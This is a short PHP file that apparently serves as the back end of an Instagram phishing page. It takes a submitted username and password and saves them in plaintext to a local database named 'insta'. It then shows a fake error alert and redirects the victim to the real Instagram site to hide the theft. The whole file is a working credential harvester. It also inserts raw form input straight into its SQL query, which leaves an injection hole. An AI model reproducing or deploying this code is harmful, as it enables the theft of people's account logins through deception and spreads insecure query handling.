<?php
echo "saga";
$conn=mysqli_connect('localhost','root','','insta');
if(!$conn){
	echo "Database connection Error" . mysqli_error();
}

if(isset($_POST['submit'])){

$name=$_POST['username'];
$password=$_POST['password'];

if(empty($name))
{
	echo'<script>alert("username required")</script>';
}
if (empty($password)) {
   echo'<script>alert("password required")</script>';     
}

if(!empty($name) AND !empty($password)){
	$sql="INSERT INTO users(username,password,logs)
VALUES('$name','$password',now())";
if(mysqli_query($conn,$sql)){
	echo"<script>alert('Error occured,Please try Again.)</script>";
	echo "<meta http-equiv='refresh' content='0;URL=https://www.instagram.com/'/>";
}

}




} 

 ?>